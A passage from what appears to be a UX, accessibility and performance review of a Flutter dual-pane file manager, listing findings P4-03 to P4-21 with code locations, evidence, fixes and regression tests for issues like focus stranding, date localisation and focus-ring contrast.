| P4-03 | PageUp/PageDown do not move the listing cursor | P2 | UX / keyboard | KNOWN (STATUS "M3 — pane row-selection model": "PageUp/PageDown are untouched"; spec 02 §2.5 requires them) | VERIFIED (test) |
| P4-04 | File names truncate at the end, hiding distinguishing suffixes and extensions | P2 | UX / visual | NEW | VERIFIED (screenshot) |
| P4-05 | Inspector overlay covers pane B by default on half-screen windows and tablets | P2 | UX / layout | NEW | VERIFIED (screenshot) |
| P4-06 | Android tablet (≥600 dp) posture has no back handling: system back finishes the app from anywhere | P2 | cross-platform | NEW | VERIFIED (code) |
| P4-07 | Dates/times are always `en` (US, 12 h), ignoring OS region and 24-hour setting | P2 | i18n / UX | NEW | VERIFIED (code) |
| P4-08 | Keyboard focus indicator on toolbar buttons, tab chips, column headers and inspector tabs is a ~1.3:1 tint | P2 | accessibility / theming | NEW | VERIFIED (code + computed) |
| P4-09 | No mouse back/forward buttons (4/5) for navigation | P3 | UX / convenience | NEW | VERIFIED (code) |
| P4-10 | Backspace during an active type-ahead navigates to the parent folder (Win/Linux) | P3 | UX / keyboard | NEW | VERIFIED (test) |
| P4-11 | Numpad Enter does nothing in the listing | P3 | keyboard | NEW | VERIFIED (code) |
| P4-12 | Sync plan table: arrow keys move the focused row off-screen (no reveal), no Home/End/Page keys | P3 | keyboard | NEW | VERIFIED (code) |
| P4-13 | Type-ahead badge covers the row it just revealed | P3 | visual | NEW | VERIFIED (screenshot) |
| P4-14 | Large text scale: the date column starves names, Info labels wrap mid-word, sync rows do not scale | P3 | visual / layout | NEW | VERIFIED (screenshot + code) |
| P4-15 | Broad listeners: each pane notification or progress tick rebuilds the header, ☰ tree, filter field, Info tab and more; per-row `DateFormat` construction | P3 | performance | NEW | LIKELY (rebuild counts measured) |
| P4-16 | Esc never deselects (02 §8.2's last tier) and there is no Deselect All | P3 | UX / spec | NEW | VERIFIED (code) |
| P4-17 | No F10 to open the ☰ main menu (Linux/Windows) and no region cycle (Ctrl+F6, 02 §8.2) | P3 | accessibility / cross-platform | NEW | VERIFIED (code) |
| P4-18 | Drag and drop: no edge auto-scroll, generic file icons in the avatar, count badge overflows its circle | P3 | UX / visual | NEW | VERIFIED (code) |
| P4-19 | Tab chips are `Draggable` without axis affinity; on touch a horizontal swipe on the strip starts a tab drag | P3 | cross-platform | NEW | LIKELY |
| P4-20 | Inactive-pane selection fill is 1.16–1.35:1 against the surface in custom presets (Solarized 1.16:1) | P3 | theming | NEW | VERIFIED (computed) |
| P4-21 | Missing daily features: file Copy/Cut/Paste + Undo, optional columns, column resize, tab reorder, launcher recents, ⌘1–9 | P2 | missing-feature | KNOWN (STATUS "D32 — adversarial review fixes" Deferred list, C18, C25; tab.select STATUS M3 tabs; tab reorder STATUS M3 inter-pane tab drag) | VERIFIED |

---

#### P4-01 — Esc/Enter in the header filter strands keyboard focus

- **Severity / category:** P2, bug / UX. NEW, VERIFIED.
- **Location:**
  - `lib/ui/workspace_shell.dart:4384-4391`: Esc runs `widget.focusNode.unfocus()`.
  - `lib/ui/workspace_shell.dart:4392-4430`: the TextField has no `onSubmitted` or `onEditingComplete`.
- **Evidence:**
  ```dart
  const SingleActivator(LogicalKeyboardKey.escape): () {
    pane?.clearFilter(); _text.clear(); widget.focusNode.unfocus(); },
  ```
  `unfocus()` defaults to `UnfocusDisposition.scope`, so primary focus moves
  to the modal route's `FocusScopeNode`, not the listing. Enter (TextInputAction.done)
  does the same through EditableText's default `unfocus()`. My scratch test
  (`zz_p4_verify_test.dart`, Linux) printed
  `after Esc primaryFocus=FocusScopeNode#…(_ModalScopeState… [PRIMARY FOCUS])`,
  and cursor `null → null` after ArrowDown. The Enter path behaved the same.
- **Failure scenario:** ⌘F, type `invoice`, press Enter or Esc, press ↓.
  Nothing happens. Space (Quick Look), Enter (open) and type-ahead are dead
  until the user clicks the pane. This is the core find-then-act loop
  ForkLift/Finder users run many times a day. There is also no ↓ from the
  field into the results, as in Finder's search field.
- **Fix:**
  - Give `_HeaderFilterField` an `onReturnToListing` callback. The shell
    passes `() => _focusPane(workspace.activePane)`.
  - Esc: clear the filter, then call `onReturnToListing()` instead of `unfocus()`.
  - Add `onSubmitted`: return focus. If the listing has no cursor and has
    matches, `setCursorIndex(0)` so Enter-then-Space previews the first match.
  - Add `SingleActivator(arrowDown)` to the field's `CallbackShortcuts`: return
    focus and select the first row.
- **Regression tests** (in `test/ui/shell/header_filter_test.dart`, with the
  harness already there):
  - After Esc, `primaryFocus.debugLabel == 'pane.left.listing'`, and ArrowDown
    sets `cursorIndex`.
  - The same after `receiveAction(TextInputAction.done)`.
  - The same after ArrowDown.
- **Effort:** S.

#### P4-02 — Going up or back loses your place

- **Severity / category:** P2, UX. NEW, VERIFIED.
- **Location:**
  - `lib/services/pane_controller.dart:1207-1213`: `goUp()` just calls `navigate(parent)`.
  - `lib/services/pane_controller.dart:1338-1347`: `goBack()`.
  - The selection resets on location change (STATUS M3 row selection).
  - `lib/ui/panes/pane_view.dart:348-367`: `_syncReveal()` scrolls any new path to offset 0.
- **Evidence:** scratch test, 80 sibling folders plus `tester`, starting in
  `/home/tester`. Backspace printed `goUp: path=/home cursor=null`. ↓ then
  printed `cursor=0 entry=a0`, and `tester` (row 80) was off-screen.
- **Failure scenario:** browse `~/Projects/app` then ⌘↑. In Finder, ForkLift,
  Transmit, Explorer, Nautilus and Dolphin, `app` is selected and scrolled into
  view, so ⌘↓ goes straight back in and ↓ goes to the next sibling. Here you
  land at the top with nothing selected and have to find `app` again. The
  same happens with Back after drilling into a big folder. Keyboard-driven
  browsing of deep remote trees suffers most.
- **Fix:**
  1. In `PaneController`, add `String? _revealAfterListing`. `goUp()` sets it
     to `paneLastSegment(current.path)` before `navigate(parent)`.
  2. Where an accepted listing resets the selection (`_applyEntries`), look up
     the row whose basename equals it. If found, activate it with
     `_selection.activate(key, single)` and clear the field. Clear it on any
     other navigation.
  3. For history, store per-entry `({String? cursorPath, double scrollOffset})`
     in a list parallel to `_history`, captured in `_issueNavigation` before
     leaving. `goBack`/`goForward` pass it as the reveal target. The scroll
     offset is a view concern: expose `restoreScrollOffset` and let
     `PaneView._syncReveal` use it instead of `jumpTo(0)`.
  4. In `PaneView._syncReveal`, when the new listing arrives with a cursor,
     reveal the cursor (centred) instead of jumping to 0.
- **Tests:**
  - Controller unit test: goUp selects the child and `cursorIndex` points at
    `tester`.
  - Widget test: after goUp with 80 siblings, the row's rect is inside the
    viewport.
  - goBack restores the prior cursor.
  - A re-list or refresh does not re-trigger the reveal.
- **Effort:** M.

#### P4-03 — PageUp/PageDown do not move the cursor

- **Severity / category:** P2, keyboard. KNOWN (noted as "untouched" in the
  STATUS M3 row-selection section, not tracked as an open item). VERIFIED.
- **Location:** `lib/ui/panes/pane_view.dart:530-540` (the `ownedKey` list)
  and `566-678` (the switch). Neither handles `pageUp`/`pageDown`.
- **Evidence:** the scratch test printed `PageDown cursor before=0 after=0`.
  The spec (02 §2.5) says "Home/End/PageUp/PageDown work from day one
  (ForkLift 4 shipped keyboard-poor and paid for years)".
- **Failure scenario:** in a 2 000-entry `/var/log` or `node_modules`,
  keyboard users can only arrow or jump to the ends.
- **Fix:**
  - Add pageUp/pageDown to `ownedKey`.
  - Compute
    `rows = max(1, (_scrollController.position.viewportDimension / _rowExtent()).floor() - 1)`.
  - Call `controller.moveCursorBy(±rows, update: cursorUpdate)` (it already
    clamps, and Shift extends), then `_revealCursor()`.
  - Repeats are fine here.
- **Test:** 200 rows in a 400 px viewport. PageDown from row 0 lands on
  `rows`, and Shift+PageDown selects the range. A stale listing swallows the
  key (the owned-key gate).
- **Effort:** S.

#### P4-04 — Names truncate at the end, hiding suffixes and extensions

- **Severity / category:** P2, UX / visual. NEW, VERIFIED (screenshot
  `d1440-dark.png`: 30 rows read `photo_with_a_somewhat_long_f…`).
- **Location:**
  - `lib/ui/panes/pane_view.dart:2918-2928`: `Text(name, overflow: ellipsis)`.
  - `lib/ui/compact/compact_listing.dart:630-638`: the same on phones.
- **Failure scenario:** camera dumps (`IMG_2026_0314_0912.jpeg`), release
  artifacts (`app-1.4.2-arm64.tar.gz` vs `…-x64.tar.gz`), and logs
  (`service.log.1`, `.2`) all look identical, and the extension that decides
  the open action is hidden. Finder and ForkLift truncate in the middle.
  `MiddleEllipsisText` exists (sidebar), but its per-row binary search, about
  8 `TextPainter` layouts per truncated row, is too costly for a 40-row
  listing that rebuilds on every cursor move.
- **Fix:** add a cheap `_TailKeepingName` widget:
  - Split the name into `head` and `tail`. The tail is the extension plus up
    to 6 preceding graphemes, or the last 8 graphemes when there is no
    extension, or empty when the name is short.
  - Render
    `Row([Flexible(Text(head, softWrap:false, overflow: ellipsis)), Text(tail)])`.
    That is two paragraph layouts with no search.
  - Keep row semantics unchanged (the row already carries the full name).
  - Use it in `_PaneRow`, `_CompactRow` and the tab chip title.
- **Test:** pump a `_PaneRow` (via PaneView harness) at 260 px width with
  `photo_with_a_somewhat_long_file_name_41.jpeg`. Assert
  `find.text('_41.jpeg')`, or the tail's `RichText`, is present and laid out
  inside the row. Also assert a short name renders as one `Text`.
- **Effort:** S–M.

#### P4-05 — Inspector overlay covers pane B by default

- **Severity / category:** P2, UX / layout. NEW, VERIFIED (screenshots
  `d760-dark.png`, `d1024-scale2-light.png`, `tab800-light.png`).
- **Location:**
  - `lib/ui/workspace_shell.dart:1872-1884`:
    `inspectorOverlay = inspectorWanted && !inspectorInline`.
  - `lib/ui/workspace_shell.dart:1978-1990`: an elevated `PositionedDirectional`
    over the panes, with no barrier and no outside-tap dismissal.
- **Evidence:** the inspector is shown by default (`initialInspectorHidden =
  false`). With the sidebar inline it goes inline only at ≥ 1053 px of
  content. A window snapped to half of a 1920 screen (≈960 px) or a 1024
  laptop window therefore has 280 px of pane B permanently covered. On an
  800 dp portrait tablet (one visible pane) the overlay hides more than half
  of the only listing.
- **Failure scenario:** a user drags a Poltergeist window to half-screen.
  Pane B's size/date columns and right half are hidden until the user finds
  ⌥⌘I. Clicking pane B does not dismiss the sheet.
- **Fix:**
  - In `_WorkspaceShellState`, keep a transient `_overlayRequested`, never
    persisted, in line with 10 §3.2's "auto-collapse is never persisted".
  - In the overlay stage, render the sheet only when `_overlayRequested` is
    true. `view.toggleInspector` in that stage and `showInspector(...)`
    (transfers started, alerts) set it.
  - Add a transparent barrier behind the sheet (`TapRegion`, or a
    `GestureDetector` over the panes' Stack) that clears it. Esc inside the
    inspector clears it too.
  - Going back to the inline stage shows the inspector per the persisted
    intent.
- **Test:** `shell_stages_test.dart` at 1000x800:
  - `inspector.overlay` finds nothing at launch.
  - `view.toggleInspector` shows it.
  - Tapping pane B hides it.
  - Widening to 1400 shows it inline.
- **Effort:** S–M.

#### P4-06 — Android tablet posture has no back handling

- **Severity / category:** P2, cross-platform. NEW, VERIFIED (code).
- **Location:** `lib/ui/workspace_shell.dart:1768-1828`. The Scaffold body has
  no `PopScope`, and a repo-wide grep finds none outside the compact posture
  (`compact_workspace.dart:403-408`), the editor and two dialogs.
  `compactPostureApplies` (`compact/compact_posture.dart:17-20`) keeps
  ≥600 dp tablets on the desktop layout.
- **Failure scenario:** on a tablet (D35 says Android is supported), a user
  three folders deep on a server presses system back or uses the back
  gesture. The root route pops, the activity finishes, and on process death
  the live SFTP sessions go. It should go back one folder, as the phone
  posture does.
- **Fix:**
  - Extract the phone's ordering into a pure `nextTouchBackStep(...)`.
  - In `WorkspaceShell.build`, when `!isDesktopPlatform(platform) && !compact`,
    wrap the body in `PopScope(canPop: step == leave, onPopInvokedWithResult: ...)`.
  - Steps in order:
    1. Close the inspector overlay.
    2. Close the filter, Quick Select or path field.
    3. Go back in the active pane (`goBack()` when `canGoBack`).
    4. Leave.
  - The drawer already closes on back through Scaffold.
- **Test:** Android override at 1200x900. Navigate into a folder,
  `await tester.binding.handlePopRoute()` returns true and the pane is at the
  parent. At the root it returns false.
- **Effort:** S.

#### P4-07 — Dates are always `en` (US, 12 h)

- **Severity / category:** P2, i18n / UX. NEW, VERIFIED (code).
- **Location:**
  - `lib/ui/panes/pane_format.dart:62,74,83`: `DateFormat.jm/yMd(localeName)`.
  - `localeName` comes from `Localizations.localeOf(context)`, which can only
    resolve to `en` (`lib/l10n/` holds only `app_en.arb`). See
    `pane_view.dart:2845`, `compact_listing.dart:580`,
    `pane_column_header.dart:59`, and the activity `history_view.dart:153` and
    `conflict_widgets.dart:224,236`.
- **Evidence:** screenshots show `3/14/2026 9:26 AM`.
  `MediaQuery.alwaysUse24HourFormat` is never read (no match in `lib/`).
- **Failure scenario:** a Swiss, German or UK user, or a Mac set to 24-hour
  time, reads `3/4/2026` as 3 April and gets AM/PM times. That is wrong for
  the date column, Get Info, conflicts and history.
- **Fix:**
  - Add `String formattingLocale(BuildContext)`. It returns the OS's first
    locale (`View.of(context).platformDispatcher.locale`, as a
    `Intl.canonicalizedLocale` name) when `DateFormat.localeExists(it)`, else
    `en`. flutter_localizations' `loadDateIntlDataIfNotLoaded` already loads
    date symbols for all Material locales.
  - Pass `use24h: MediaQuery.alwaysUse24HourFormatOf(context)` and pick
    `DateFormat.Hm` over `jm`.
  - Cache the formatters in a static map keyed by `(locale, use24h)`. That
    also fixes part of P4-15.
  - UI strings stay English.
- **Tests:**
  - `pane_format_test`: `de_CH` + 24 h gives `14.03.2026 09:26`, `en_GB`
    gives `14/03/2026 09:26`.
  - Widget test with
    `tester.platformDispatcher.localesTestValue = [Locale('de','CH')]`.
- **Effort:** S–M.

#### P4-08 — Weak keyboard focus indicator on InkWell controls

- **Severity / category:** P2, accessibility / theming. NEW, VERIFIED
  (code + computed).
- **Location:**
  - `lib/theme/app_theme.dart:770`: `focusColor: scheme.primary.withValues(alpha: 0.18)`.
  - These controls rely on it alone, with no ring:
    - `_ToolbarButton` (`shell/header_toolbar.dart:411`)
    - tab chips (`panes/pane_tabs_view.dart:839`)
    - column header cells (`panes/pane_column_header.dart:285`)
    - inspector tabs (`inspector/inspector_view.dart:191`)
    - the ☰ `IconButton`
- **Evidence:** the tint's contrast against the header is 1.28:1 (light:
  `#CFDFDD` on `#F6F6F8`) and 1.41:1 (dark). The sidebar kit already draws a
  real ring in keyboard mode (`_KeyboardFocusRing`, `sidebar_kit.dart:1320`,
  1675), so the header, tabs and inspector are inconsistent with it.
- **Failure scenario:** a keyboard-only or low-vision user tabbing through the
  header cannot tell which button will fire. This fails WCAG 2.4.7 and the
  1.4.11 3:1 guidance for focus indicators.
- **Fix:**
  - Lift the kit's keyboard-mode ring into `ui/shell/focus_ring.dart`: a
    `FocusRing` widget that listens to `FocusManager.highlightMode` plus the
    child's focus and paints a 2 px `colorScheme.primary` foreground border
    with the control's radius.
  - Wrap the five controls above with it.
  - Add a pair to `contrast_matrix_test` (primary vs header/strip/inspector
    ≥ 3:1).
- **Test:** Tab into the header until New Folder is focused, then assert a
  `DecoratedBox` with a 2 px border is an ancestor of `command.file.newFolder`.
  After a pointer click, assert no ring.
- **Effort:** S–M.

#### P4-09 — No mouse back/forward buttons

- **Severity / category:** P3, convenience. NEW, VERIFIED (no
  `kBackMouseButton`/`kForwardMouseButton` anywhere in `lib/`).
- **Location:** `lib/ui/panes/pane_view.dart:1163-1184`, the pane-wide
  `Listener.onPointerDown`.
- **Failure scenario:** mouse users (Logitech, MX series) press the thumb
  "back" button, which works in Finder, Explorer, ForkLift and browsers.
  Nothing happens.
- **Fix:** in that listener, before focus handling:
  - `if (event.buttons & kBackMouseButton != 0) { widget.controller.goBack(); return; }`
  - The same for forward.
  - The row listener (`_onRowPointerDown`) already ignores non-primary and
    non-secondary buttons, so no selection side effect.
  - Optionally a macOS two-finger swipe later.
- **Test:** `tester.startGesture(rowCenter, buttons: kBackMouseButton)`.
  The location goes back and the selection is unchanged.
- **Effort:** S.

#### P4-10 — Backspace mid type-ahead navigates up

- **Severity / category:** P3, keyboard. NEW, VERIFIED (test printed
  `before=/home/tester after=/home` after typing `fi` then Backspace).
- **Location:** `lib/ui/panes/pane_view.dart:615-625`.
- **Failure scenario:** a user types `repro`, sees the badge, hits Backspace
  to fix a typo, and is thrown to the parent folder. The badge makes the
  buffer look editable.
- **Fix:**
  - In the backspace case, if `controller.typeAheadActive`, call a new
    `controller.typeAheadBackspace()`. It drops the last grapheme, re-runs the
    match (or clears when empty) and re-arms the 1 s reset. Return handled.
  - Keep goUp when no buffer is live.
- **Test:** type `fi`, then Backspace. The location is unchanged and the badge
  reads `f`.
- **Effort:** S.

#### P4-11 — Numpad Enter ignored in the listing

- **Severity / category:** P3. NEW, VERIFIED (code).
- **Location:**
  - `lib/ui/panes/pane_view.dart:530-540,590-604`: only `LogicalKeyboardKey.enter`.
    `numpadEnter` is handled only as the error Retry (line 546).
  - `lib/ui/panes/pane_commands.dart:276`: `go.open`'s non-mac activator is
    `SingleActivator(enter)` only.
  - The sidebar kit does accept numpadEnter (`sidebar_kit.dart:1534`).
- **Failure scenario:** Windows or Linux users with a keypad, a
  Total-Commander habit, get no open. On macOS, keypad Enter does not rename.
- **Fix:** treat `numpadEnter` exactly as `enter` in `ownedKey` and the switch,
  and add `SingleActivator(numpadEnter)` to `go.open`'s `other` list.
- **Test:** on Linux, numpadEnter on a folder row navigates into it.
- **Effort:** S.

#### P4-12 — Sync plan table keyboard: no reveal, no paging

- **Severity / category:** P3. NEW, VERIFIED (code).
- **Location:**
  - `lib/ui/sync/sync_plan_view.dart:246-281`: arrow keys `setState` the
    focused row only.
  - `lib/ui/sync/sync_plan_table.dart:184`: `ListView.builder` without a
    controller. There is no `ScrollController`, `ensureVisible` or `jumpTo`
    in either file.
- **Failure scenario:** in a 3 000-item Simulate review, arrowing down past
  row ~30 moves the focus ring off-screen. Space then toggles a row the user
  cannot see, silently changing what the run will do.
- **Fix:**
  - Own a `ScrollController` in the view and pass it to the table.
  - Rows are fixed-height (`chrome.rowExtent`, line 524) and section headers
    are 28 px (line 320). After each key move, compute the focused entry's
    offset from the flattened `entries` list and `jumpTo` minimally.
  - Add Home/End/PageUp/PageDown.
  - Use a foreground decoration for the focus border (line 533 uses
    `decoration.border`, which shifts content by 1 px).
- **Test:** 200 items. Press ↓ 60 times, and the focused row's rect is inside
  the list viewport.
- **Effort:** S–M.

#### P4-13 — Type-ahead badge covers the revealed row

- **Severity / category:** P3, visual. NEW, VERIFIED (screenshots
  `d1440-light-sel.png`, `d1440-scale15-dark-sel.png`: the `r` badge sits on
  top of the matched `report-0.pdf` row).
- **Location:**
  - `lib/ui/panes/pane_view.dart:1676-1684`: the badge is at `bottom: 8`.
  - `369-389`: `_revealCursor` scrolls minimally, so a match below the fold
    lands on the last visible row, under the badge.
- **Fix:** give `_revealCursor` a `bottomInset` (badge height + 16). The
  type-ahead path passes it, or reveals the match centred as Finder does.
  Alternatively pin the badge to the location header's trailing end.
- **Test:** after type-ahead to row 60 of 63, the row's global rect does not
  intersect `find.byKey(ValueKey('pane.typeAhead'))`'s rect.
- **Effort:** S.

#### P4-14 — Large text scale layout gaps

- **Severity / category:** P3, visual / layout. NEW, VERIFIED.
- **Location and evidence:**
  - **The date column starves names.**
    - Code: `panes/pane_column_header.dart:32-45`. The floor is
      `scale(116)` and the share cap is `0.35·width`, but the floor wins, so
      at 2x the date takes 232 px of a ~390 px pane.
    - Screenshot (`d1024-scale2-light.png`): names read `a-really…`,
      `Docum…`, `photo_…`.
    - At 1.5x on a 1440 window (`d1440-scale15-dark-sel.png`), Size folds
      away while 280 px go to a date that could be shortened.
    - In such a pane the rename editor's width clamps to 0
      (`pane_view.dart:1823,1876` pass `maxWidth` that can go negative; the
      editor clamps it at 2112), so the typed name is invisible.
  - **Info labels wrap mid-word.** `panes/info_panel.dart:915,927` use a fixed
    `SizedBox(width: 86)` label column, so "Permissio/ns" wraps at 1.5x. Any
    longer translation will wrap at 1x.
  - **Sync plan rows do not scale.** They use a fixed `chrome.rowExtent` of
    22 px (`sync/sync_plan_table.dart:524`), so at 2x the 26 px text is
    clipped. Section headers are a fixed 28 px (320) and the column header a
    fixed 24 px (258). The listing's own rows scale correctly
    (`scaledPaneRowExtent`).
  - **Minor fixed heights.** The header filter field is a fixed 28 px, which
    clips its hint at 2x. The tab strip is a fixed 30 px.
- **Fix:**
  - In `PaneColumnMetrics.forWidth`, guarantee a name minimum (for example
    `scale(140)`). When the date would violate it, fall back to a compact
    date (`yMd` without time, or `MMMd`) through a `compactDates` flag, and
    drop the date column only below that.
  - Make the Info label column `scale(86)`, or use a `Table` with
    `IntrinsicColumnWidth` capped at 40% of the width.
  - Scale the sync row and header extents with `MediaQuery.textScalerOf`.
- **Tests:**
  - `PaneColumnMetrics.forWidth(390, TextScaler.linear(2))` leaves
    `390 - trailingExtent - nameStart ≥ 140`.
  - InfoPanel golden or finder at 1.5x: the label's `RenderParagraph` has one line.
- **Effort:** M.

#### P4-15 — Broad rebuilds on every pane notification and progress tick

- **Severity / category:** P3, performance. NEW, LIKELY.
- **Evidence:**
  - Rebuild counts measured with `debugOnRebuildDirtyWidget`. A single
    `PaneController.notifyListeners()` rebuilt 46 `_PaneRow`, 8
    `_ToolbarButton`, 15 `Tooltip`, 9 `EditableText` (header filter plus Info
    panel fields), 8 `SelectableText` and 7 `_InfoRow` (Info tab), 12
    `Scrollable`, and the menu host.
  - Measured timing: about 100 ms per notification in debug JIT
    (`zz_p4_perf_test.dart`). That is debug overhead, not release timing, but
    it shows where the work is.
- **Sources:**
  - `workspace_shell.dart:1744-1753`: `enablement` merges `workspace.left`
    and `workspace.right`, and PaneTabsController forwards every tab's
    notifications (`pane_tabs_controller.dart:921`). `_activity` notifies on
    every progress event (`activity_panel_controller.dart:372-384`).
  - That listenable drives `AppMenuHost` (1793-1800) and the header
    (1994-2028). The header re-measures labels with `TextPainter`s per fold
    (`header_toolbar.dart:190-248`, `_labelledButtonWidth` at 231), and `AppMainMenuButton.build` rebuilds the
    whole ☰ `MenuAnchor` tree (`app_menu_host.dart:413-462`) even when closed.
  - `_HeaderFilterField._syncText` calls `setState` on every notification of
    the bound pane (`workspace_shell.dart:4356-4365`).
  - `InspectorView` merges `activity` (`inspector/inspector_view.dart:86-87`),
    so the Info tab (preview plus InfoPanel) rebuilds on every transfer
    progress tick while Info is showing.
  - `formatPaneModified` constructs two `DateFormat`s per row per build
    (`pane_format.dart:62-86`). A microbenchmark measured ~14 µs per row with
    fresh formatters vs 0.6 µs cached.
  - `PaneColumnMetrics.modifiedWidthIn` lays out 3 `TextPainter`s on every
    pane rebuild (`pane_view.dart:1428-1433`).
  - `_buildRow` calls the O(n) `controller.selectedEntries` for each visible
    selected row of a multi-selection (`pane_view.dart:1937-1940`), and
    `_summary` calls it again (2535-2542).
  - The context-menu rows are built on every build even while closed
    (`pane_view.dart:1190`).
- **Failure scenario:** holding ↓ (key repeat) in a large listing with the
  Info tab open, or running 6 transfers, re-evaluates about 70 `enabled()`
  predicates, re-lays out header labels and rebuilds Info widgets every frame.
  That is plausible jank on low-end Linux and Windows machines, and it eats
  the D12 frame budget.
- **Fix (each part independent):**
  1. Give PaneController a cheap `commandStateKey` record (location, phase,
     verbsEnabled, selectedCount>0, selectedCount>1, cursor kind, filter
     active, hidden, canGoBack/Forward), exposed as a `ValueListenable`.
     Merge those into `enablement` instead of the strips.
  2. Replace `_activity` in `enablement` with a
     `ValueListenable<({int live, bool paused})>`.
  3. Have the inspector's tab switcher read that derived count.
  4. `_HeaderFilterField`: `setState` only when the query, `filterActive` or
     the counts changed.
  5. Memoize `DateFormat`s (see P4-07) and `modifiedWidthIn` per `(locale,
     scaler, style)`.
  6. Compute `selectedEntries` once per `_listingBody` build.
  7. Build the context-menu children only while `_contextMenu.isOpen`.
- **Test:** a rebuild-count widget test asserting that a plain cursor move does
  not rebuild `_ToolbarButton`/`AppMainMenuButton`/`InfoPanel`-unrelated
  widgets, using the same `debugOnRebuildDirtyWidget` harness.
- **Effort:** M. Each part is S.

#### P4-16 — Esc never deselects; no Deselect All

- **Severity / category:** P3, UX / spec. NEW, VERIFIED.
- **Location:** `lib/ui/panes/pane_view.dart:735-743`. After the type-ahead
  tier the handler returns `ignored`, although the spec's total order
  (02 §8.2) ends "…> clears a pending type-ahead buffer … > deselects".
  There is no `edit.deselectAll` command.
- **Failure scenario:** after Select All (⌘A) the only way out is clicking a
  single row. Invert Selection on an empty selection is a workaround nobody
  finds.
- **Fix:** add a final tier, `else if (controller.selectedCount > 0)
  controller.clearSelection()`. It already exists
  (`pane_controller.dart:1666`), with the cursor kept or dropped per spec.
  Register `edit.deselectAll` (⌥⌘A macOS, Ctrl+Shift+A elsewhere) in the Edit
  menu.
- **Test:** ⌘A then Esc gives `selectedCount == 0`. With the filter active,
  the first Esc still clears the filter (existing tier order).
- **Effort:** S.

#### P4-17 — No F10 for the ☰ menu; no region cycle

- **Severity / category:** P3, accessibility / cross-platform. NEW, VERIFIED.
- **Location:**
  - `lib/ui/menus/app_menu_host.dart:398-462`: `AppMainMenuButton` has no
    activator. Plain F10 is deliberately let through by the pane
    (`pane_view.dart:642-647`).
  - `view.cycleRegion` (⌃F6 / Ctrl+F6, 02 §8.2 and §8.3) is not registered:
    grep finds no `cycleRegion` in `lib/`.
- **Failure scenario:** on GNOME (HIG: F10 opens the primary menu) and on
  Windows (F10 or Alt focuses the menu bar), keyboard users cannot open the
  menu tree except by tabbing to ☰. Because Tab is repurposed as pane swap
  over listings, reaching the sidebar, inspector or splitters from a listing
  takes a long Shift+Tab walk. The spec introduced Ctrl+F6 exactly for this.
- **Fix:**
  - Expose the ☰ `MenuController` via the shell. Register `app.openMainMenu`
    with `SingleActivator(f10)` on Linux/Windows: it opens the menu and
    focuses the first `SubmenuButton`.
  - Implement `view.cycleRegion` / reverse over
    `[sidebar focus target, left listing, right listing (if shown), inspector tab switcher, the three splitter FocusNodes]`
    skipping unmounted ones.
- **Test:** F10 opens the menu with focus on the File submenu. Ctrl+F6 from
  the left listing focuses the right listing, then the inspector, and so on.
- **Effort:** S–M.

#### P4-18 — Drag-and-drop polish

- **Severity / category:** P3. NEW, VERIFIED (code).
- **Location and problems:**
  - **No edge auto-scroll.** `lib/ui/panes/pane_drop_area.dart:200-265`
    resolves hover and the spring-load but never auto-scrolls. Dragging onto
    a folder row below the fold of a long listing needs a wheel scroll
    mid-drag.
  - **Generic avatar icons.** The avatar shows two generic
    `insert_drive_file_outlined` icons even for folders (lines 564, 569).
  - **Count badge overflows.** The badge is
    `BoxDecoration(shape: BoxShape.circle)` with horizontal padding
    (line 639). A circle paints at the shortest side, so `128` overflows the
    disc.
- **Fix:**
  - In the in-app and OS `onMove`, when the pointer is within 28 px of the
    list's top or bottom edge, run a 16 ms `Timer.periodic` that
    `jumpTo`s by a speed proportional to depth. Cancel it on leave, drop or
    change. The row math already re-resolves on move.
  - Use `kindGlyph(paneKindCategory(...))` with the family hue for a
    single-item avatar.
  - Use a `StadiumBorder` (`ShapeDecoration`) for the badge.
- **Test:** during a drag hovering the bottom edge for 500 ms,
  `scrollController.offset > 0`.
- **Effort:** S–M.

#### P4-19 — Tab chips steal horizontal swipes on touch

- **Severity / category:** P3, cross-platform. NEW, LIKELY.
- **Location:**
  - `lib/ui/panes/pane_tabs_view.dart:865-874`: `Draggable<PaneTab>` on every
    platform, `affinity` null.
  - The strip is a horizontal `SingleChildScrollView` (474-476).
  - Rows deliberately skip `Draggable` on touch (`pane_view.dart:1924-1931`);
    tabs do not.
- **Failure scenario:** on an Android tablet with overflowing tabs, swiping the
  strip to reach a tab starts a tab drag avatar instead of scrolling. That is
  Flutter's documented `Draggable`-in-scrollable conflict.
- **Fix:** on touch platforms use `LongPressDraggable`, or
  `Draggable(affinity: Axis.vertical)`.
- **Test:** Android override, fling horizontally on a chip in a 10-tab strip.
  The scroll offset changes and no `_TabDragAvatar` is shown.
- **Effort:** S.

#### P4-20 — Inactive selection nearly invisible in custom presets

- **Severity / category:** P3, theming. NEW, VERIFIED (computed with the
  WCAG formula over the preset values).
- **Location:** `lib/theme/app_theme.dart:573`
  (`inactiveSelectionFill: n.containerHighest`) and 259-261
  (`_mix(container, text, 0.08)`).
- **Evidence:** contrast of the inactive fill against the pane surface:

  | Palette | Contrast |
  |---|---|
  | default dark | 1.49 |
  | default light | 1.26 |
  | Midnight | 1.35 |
  | Terminal | 1.33 |
  | Newsprint | 1.23 |
  | Paper | 1.21 |
  | Solarized | 1.16 |

- **Failure scenario:** in two-pane work (select in A, drop in B), the
  inactive pane's selection is what you are about to transfer. In Solarized
  and Paper it all but disappears.
- **Fix:** derive `inactiveSelectionFill` separately. Mix from the surface
  toward the text until `contrastRatio(fill, surface) ≥ 1.3`, the default
  light's level, capped at a mix of 0.25.
- **Test:** `theme_build_test` iterating `ThemePresets.all` × both brightnesses,
  asserting ≥ 1.25 and that the text on it still clears 4.5:1.
- **Effort:** S.

#### P4-21 — Daily features a Transmit/ForkLift user will miss (known deferrals)

- **Severity / category:** P2, missing-feature. KNOWN. None of these is in
  the numbered open items. They are recorded only in dated STATUS sections.
- **Known gaps:**
  - **File Copy/Cut/Paste (⌘C/⌘X/⌘V, 02 §2.6 / §8.3) and Undo/Redo.**
    STATUS "D32 — adversarial review fixes → Deferred". Grep finds no
    `edit.copy`/`edit.paste`/`edit.undo` in `lib/`.
  - **Optional Kind/Permissions/Owner/Group columns (C25) and column
    resizing.** STATUS "D32 … Deferred".
  - **Within-strip tab reorder.** STATUS M3 inter-pane tab drag,
    `pane_tabs_view.dart:376-377`.
  - **Launcher recents/server grid (C18).**
  - **`tab.select1–9`.** STATUS M3 tabs.
- **First useful slice for the clipboard:**
  - Add an app-internal `FileClipboard` (a `ChangeNotifier` holding source
    `FsLocation`, root paths and `copy|move`).
  - `edit.copy` / `edit.cut` snapshot the active pane's selection, reusing
    `PaneEntryDrag`.
